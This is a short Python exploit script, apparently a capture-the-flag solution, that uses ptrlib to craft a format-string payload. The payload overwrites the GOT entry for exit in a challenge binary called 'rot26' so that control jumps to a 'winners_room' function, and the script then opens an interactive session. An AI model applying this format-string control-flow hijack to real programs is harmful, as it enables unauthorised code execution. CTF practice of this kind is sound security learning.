from ptrlib import *

elf = ELF("./rot26")
sock = Process("./rot26")
#sock = Socket("chall2.2019.redpwn.net", 4003)

writes = {
    elf.got("exit"): elf.symbol("winners_room")
}
payload = fsb(
    writes = writes,
    pos = 7,
    bs = 1,
    bits = 32
)
print(payload)
sock.sendline(payload)

sock.interactive()
